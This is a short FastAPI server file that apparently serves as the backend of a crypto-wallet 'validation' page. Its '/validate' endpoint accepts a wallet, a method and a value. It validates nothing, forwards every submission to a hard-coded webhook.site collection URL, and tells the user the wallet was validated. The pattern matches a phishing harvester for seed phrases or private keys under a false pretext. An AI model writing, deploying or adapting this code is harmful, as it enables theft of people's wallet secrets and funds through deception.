from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx

app = FastAPI()

# Allow all origins (during testing)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class ValidationData(BaseModel):
    wallet: str
    method: str
    value: str

@app.post("/validate")
async def validate_wallet(data: ValidationData):
    # Send to webhook
    try:
        async with httpx.AsyncClient() as client:
            await client.post(
                "https://webhook.site/2920d0a0-1182-4b6a-a7af-921312c87c55",
                json=data.dict()
            )
        print("✅ Data forwarded to webhook.")
    except Exception as e:
        print("❌ Webhook forwarding failed:", e)

    # DO NOT log to file on Railway/Vercel — file system is not writable
    # try:
    #     with open("submissions.txt", "a") as f:
    #         f.write(f"{data.wallet},{data.method},{data.value}\n")
    #     print("📝 Logged to file.")
    # except Exception as e:
    #     print("⚠️ File logging failed:", e)

    print("📥 Received validation data:", data.dict())
    return {
        "status": "success",
        "message": f"Wallet '{data.wallet}' validated via {data.method}."
    }
